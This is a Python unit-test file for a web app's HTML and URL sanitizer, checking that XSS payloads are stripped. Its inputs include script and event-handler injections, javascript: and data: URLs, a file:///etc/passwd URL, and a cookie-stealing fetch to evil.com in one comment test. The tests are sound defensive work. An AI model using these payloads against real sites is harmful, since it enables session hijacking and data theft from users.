"""
Unit Tests for Security Utilities

Tests HTML sanitization and XSS protection functionality.
Validates OWASP A03:2021 Injection prevention.

Created for Task Group 5: Security Hardening - Task 5.2
"""

import pytest
from src.core.security import (
    sanitize_html,
    sanitize_text_fields,
    sanitize_url,
    is_safe_html,
    get_xss_test_payloads,
    ALLOWED_TAGS,
    ALLOWED_PROTOCOLS
)


class TestHTMLSanitization:
    """Test HTML sanitization functions"""

    def test_sanitize_html_removes_script_tags(self):
        """Test that <script> tags are completely removed"""
        dangerous = "<script>alert('XSS')</script>"
        result = sanitize_html(dangerous)
        assert result == ""
        assert "<script>" not in result
        assert "alert" not in result

    def test_sanitize_html_removes_dangerous_event_handlers(self):
        """Test that event handlers (onerror, onload, etc.) are removed"""
        test_cases = [
            ("<img src=x onerror=alert('XSS')>", ""),
            ("<body onload=alert('XSS')>", ""),
            ("<input onfocus=alert('XSS') autofocus>", ""),
            ("<svg/onload=alert('XSS')>", ""),
        ]

        for dangerous, expected in test_cases:
            result = sanitize_html(dangerous)
            assert "alert" not in result.lower()
            assert "onerror" not in result.lower()
            assert "onload" not in result.lower()
            assert "onfocus" not in result.lower()

    def test_sanitize_html_allows_safe_tags(self):
        """Test that safe formatting tags are preserved"""
        safe_html = "<p>Hello <strong>World</strong> with <em>formatting</em></p>"
        result = sanitize_html(safe_html)
        assert result == safe_html
        assert "<p>" in result
        assert "<strong>" in result
        assert "<em>" in result

    def test_sanitize_html_allows_safe_lists(self):
        """Test that ul/ol/li tags are preserved"""
        safe_html = "<ul><li>Item 1</li><li>Item 2</li></ul>"
        result = sanitize_html(safe_html)
        assert "<ul>" in result
        assert "<li>" in result
        assert "Item 1" in result

    def test_sanitize_html_removes_javascript_urls(self):
        """Test that javascript: URLs in links are removed"""
        dangerous = "<a href='javascript:alert(1)'>Click me</a>"
        result = sanitize_html(dangerous)
        assert "javascript:" not in result.lower()
        assert "alert" not in result
        # Link text may be preserved, but href should be removed
        assert "Click me" in result or result == ""

    def test_sanitize_html_allows_safe_links(self):
        """Test that https: links are preserved"""
        safe_html = "<a href='https://example.com'>Safe Link</a>"
        result = sanitize_html(safe_html)
        assert "<a" in result
        assert "https://example.com" in result
        assert "Safe Link" in result

    def test_sanitize_html_handles_none(self):
        """Test that None input returns None"""
        result = sanitize_html(None)
        assert result is None

    def test_sanitize_html_handles_empty_string(self):
        """Test that empty string returns empty string"""
        result = sanitize_html("")
        assert result == ""

    def test_sanitize_html_handles_whitespace_only(self):
        """Test that whitespace-only string is preserved"""
        result = sanitize_html("   ")
        assert result == "   "

    def test_sanitize_html_removes_iframe(self):
        """Test that iframe tags are removed (XSS vector)"""
        dangerous = "<iframe src='https://evil.com'></iframe>"
        result = sanitize_html(dangerous)
        assert "<iframe" not in result.lower()
        assert "evil.com" not in result

    def test_sanitize_html_removes_object_embed(self):
        """Test that object/embed tags are removed"""
        test_cases = [
            "<object data='evil.swf'></object>",
            "<embed src='evil.swf'>",
        ]

        for dangerous in test_cases:
            result = sanitize_html(dangerous)
            assert "object" not in result.lower()
            assert "embed" not in result.lower()
            assert "evil" not in result

    def test_sanitize_html_strips_unknown_tags(self):
        """Test that unknown/dangerous tags are stripped"""
        dangerous = "<custom-element>content</custom-element>"
        result = sanitize_html(dangerous)
        # Content should remain, tags should be stripped
        assert "content" in result
        assert "custom-element" not in result


class TestTextFieldsSanitization:
    """Test sanitize_text_fields function"""

    def test_sanitize_text_fields_sanitizes_specified_fields(self):
        """Test that specified fields are sanitized"""
        obj = {
            "title": "<script>XSS</script>",
            "description": "<p>Safe content</p>",
            "other_field": "untouched"
        }

        result = sanitize_text_fields(obj, ["title", "description"])

        assert result["title"] == ""
        assert result["description"] == "<p>Safe content</p>"
        assert result["other_field"] == "untouched"

    def test_sanitize_text_fields_handles_missing_fields(self):
        """Test that missing fields are gracefully handled"""
        obj = {"title": "<script>XSS</script>"}

        # Should not raise error for missing 'description' field
        result = sanitize_text_fields(obj, ["title", "description"])

        assert result["title"] == ""
        assert "description" not in result

    def test_sanitize_text_fields_handles_none_values(self):
        """Test that None values are preserved"""
        obj = {
            "title": None,
            "description": "<p>Content</p>"
        }

        result = sanitize_text_fields(obj, ["title", "description"])

        assert result["title"] is None
        assert result["description"] == "<p>Content</p>"

    def test_sanitize_text_fields_modifies_in_place(self):
        """Test that object is modified in-place"""
        obj = {"title": "<script>XSS</script>"}

        result = sanitize_text_fields(obj, ["title"])

        # Should return same object reference
        assert result is obj
        assert obj["title"] == ""


class TestURLSanitization:
    """Test URL sanitization function"""

    def test_sanitize_url_allows_https(self):
        """Test that HTTPS URLs are allowed"""
        url = "https://example.com/path"
        result = sanitize_url(url)
        assert result == url

    def test_sanitize_url_allows_http(self):
        """Test that HTTP URLs are allowed"""
        url = "http://example.com/path"
        result = sanitize_url(url)
        assert result == url

    def test_sanitize_url_allows_mailto(self):
        """Test that mailto: URLs are allowed"""
        url = "mailto:user@example.com"
        result = sanitize_url(url)
        assert result == url

    def test_sanitize_url_blocks_javascript(self):
        """Test that javascript: URLs are blocked"""
        url = "javascript:alert('XSS')"
        result = sanitize_url(url)
        assert result is None

    def test_sanitize_url_blocks_data(self):
        """Test that data: URLs are blocked"""
        url = "data:text/html,<script>alert('XSS')</script>"
        result = sanitize_url(url)
        assert result is None

    def test_sanitize_url_blocks_vbscript(self):
        """Test that vbscript: URLs are blocked"""
        url = "vbscript:msgbox('XSS')"
        result = sanitize_url(url)
        assert result is None

    def test_sanitize_url_blocks_file(self):
        """Test that file: URLs are blocked"""
        url = "file:///etc/passwd"
        result = sanitize_url(url)
        assert result is None

    def test_sanitize_url_allows_protocol_relative(self):
        """Test that protocol-relative URLs are allowed"""
        url = "//example.com/path"
        result = sanitize_url(url)
        assert result == url

    def test_sanitize_url_allows_relative_paths(self):
        """Test that relative paths are allowed"""
        test_cases = [
            "/path/to/resource",
            "./relative/path",
            "../parent/path",
            "resource.html"
        ]

        for url in test_cases:
            result = sanitize_url(url)
            assert result == url

    def test_sanitize_url_handles_none(self):
        """Test that None input returns None"""
        result = sanitize_url(None)
        assert result is None

    def test_sanitize_url_handles_case_insensitive(self):
        """Test that protocol checking is case-insensitive"""
        dangerous_urls = [
            "JavaScript:alert(1)",
            "JAVASCRIPT:alert(1)",
            "JaVaScRiPt:alert(1)"
        ]

        for url in dangerous_urls:
            result = sanitize_url(url)
            assert result is None


class TestIsSafeHTML:
    """Test is_safe_html function"""

    def test_is_safe_html_returns_true_for_safe_content(self):
        """Test that safe HTML returns True"""
        safe_html = "<p>Hello <strong>World</strong></p>"
        assert is_safe_html(safe_html) is True

    def test_is_safe_html_returns_false_for_dangerous_content(self):
        """Test that dangerous HTML returns False"""
        dangerous = "<script>alert('XSS')</script>"
        assert is_safe_html(dangerous) is False

    def test_is_safe_html_returns_true_for_empty_string(self):
        """Test that empty string returns True"""
        assert is_safe_html("") is True

    def test_is_safe_html_returns_true_for_plain_text(self):
        """Test that plain text returns True"""
        assert is_safe_html("Just plain text") is True


class TestXSSPayloads:
    """Test against OWASP XSS payloads"""

    def test_sanitize_html_blocks_all_xss_payloads(self):
        """Test that all common XSS payloads are blocked"""
        payloads = get_xss_test_payloads()

        for payload in payloads:
            result = sanitize_html(payload)

            # Verify no dangerous keywords remain
            dangerous_keywords = [
                'alert', 'javascript:', 'onerror', 'onload',
                'onfocus', 'onclick', 'onmouseover', '<script',
                'eval(', 'expression('
            ]

            for keyword in dangerous_keywords:
                assert keyword.lower() not in result.lower(), \
                    f"Dangerous keyword '{keyword}' found in sanitized result for payload: {payload}"

    def test_xss_payload_list_not_empty(self):
        """Test that XSS payload list is populated"""
        payloads = get_xss_test_payloads()
        assert len(payloads) > 0
        assert len(payloads) >= 10  # Should have at least 10 common payloads


class TestEdgeCases:
    """Test edge cases and error handling"""

    def test_sanitize_html_handles_nested_tags(self):
        """Test deeply nested tags are handled correctly"""
        nested = "<div><div><div><script>alert('XSS')</script></div></div></div>"
        result = sanitize_html(nested)
        assert "<script>" not in result
        assert "alert" not in result

    def test_sanitize_html_handles_malformed_html(self):
        """Test that malformed HTML doesn't crash sanitizer"""
        malformed = "<p><strong>Unclosed tags<p><script>alert(1)"
        result = sanitize_html(malformed)
        # Should not raise exception
        assert result is not None
        assert "<script>" not in result

    def test_sanitize_html_handles_unicode(self):
        """Test that Unicode characters are preserved"""
        unicode_text = "<p>Hello 世界 🌍</p>"
        result = sanitize_html(unicode_text)
        assert "世界" in result
        assert "🌍" in result

    def test_sanitize_html_handles_html_entities(self):
        """Test that HTML entities are handled correctly"""
        entities = "<p>&lt;script&gt;alert('XSS')&lt;/script&gt;</p>"
        result = sanitize_html(entities)
        # HTML entities should be preserved
        assert "&lt;" in result or "<" in result
        assert "&gt;" in result or ">" in result

    def test_sanitize_html_handles_very_long_input(self):
        """Test that very long input is handled efficiently"""
        long_input = "<p>Safe content</p>" * 10000
        result = sanitize_html(long_input)
        # Should not raise exception or timeout
        assert result is not None
        assert len(result) > 0


# ============================================================================
# Integration Tests with Real-World Scenarios
# ============================================================================

class TestRealWorldScenarios:
    """Test with real-world user input scenarios"""

    def test_blog_post_content(self):
        """Test typical blog post with formatting"""
        blog_content = """
        <h1>My Blog Post</h1>
        <p>This is a paragraph with <strong>bold</strong> and <em>italic</em> text.</p>
        <ul>
            <li>First item</li>
            <li>Second item</li>
        </ul>
        <a href="https://example.com">External link</a>
        """

        result = sanitize_html(blog_content)

        # Safe tags should be preserved
        assert "<p>" in result
        assert "<strong>" in result
        assert "<em>" in result
        assert "<ul>" in result
        assert "<li>" in result
        assert "<a" in result
        assert "https://example.com" in result

    def test_user_comment_with_xss_attempt(self):
        """Test user comment with embedded XSS attempt"""
        comment = """
        Great article! <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
        Check out my site: <a href="javascript:alert('XSS')">Click here</a>
        """

        result = sanitize_html(comment)

        # XSS should be removed
        assert "<script>" not in result
        assert "javascript:" not in result
        assert "fetch" not in result
        assert "document.cookie" not in result

        # Safe content should be preserved
        assert "Great article!" in result

    def test_task_description_with_code_snippet(self):
        """Test task description with code formatting"""
        description = """
        <p>Task: Fix the authentication bug</p>
        <code>const token = getAuthToken();</code>
        <p>Steps:</p>
        <ol>
            <li>Check token validity</li>
            <li>Refresh if expired</li>
        </ol>
        """

        result = sanitize_html(description)

        # Should preserve all safe tags
        assert "<p>" in result
        assert "<code>" in result
        assert "<ol>" in result
        assert "<li>" in result
        assert "const token = getAuthToken();" in result
